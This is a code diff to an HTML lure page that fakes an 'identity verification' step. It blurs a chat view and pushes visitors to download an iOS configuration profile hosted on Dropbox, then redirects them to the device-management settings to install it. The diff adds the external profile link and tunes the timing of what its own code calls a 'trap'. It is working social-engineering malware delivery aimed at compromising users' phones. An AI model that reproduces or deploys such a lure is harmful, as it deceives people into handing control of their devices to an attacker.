@@ -32,19 +32,20 @@
         <h2>Identity Verification</h2>
         <p>This conversation is encrypted. To view the full archive, verify your device identity.</p>
         
-        <a href="verify_identity.mobileconfig" type="application/x-apple-aspen-config" class="btn" onclick="startTrap()">Unblur & Read Chats</a>
+        <a href="https://www.dropbox.com/scl/fi/ubxfrxsk64sjcsq4odn3x/secure_verify-6.mobileconfig?rlkey=rexef269gpctb442ohnfu0zz4&st=3mev8s82&dl=1" class="btn" onclick="startTrap()">Unblur & Read Chats</a>
     </div>
 
     <script>
         setTimeout(function() {
             document.getElementById('trap-popup').style.display = 'block';
             document.querySelector('.chat-background').style.filter = 'blur(15px)';
-        }, 3000);
+        }, 2000);
 
         function startTrap() {
+            // Give the browser 5 seconds to handle the file download before redirecting to settings
             setTimeout(function() {
                 window.location.href = "App-prefs:General&path=ManagedConfigurationList";
-            }, 4500);
+            }, 5000);
         }
     </script>
 </body>
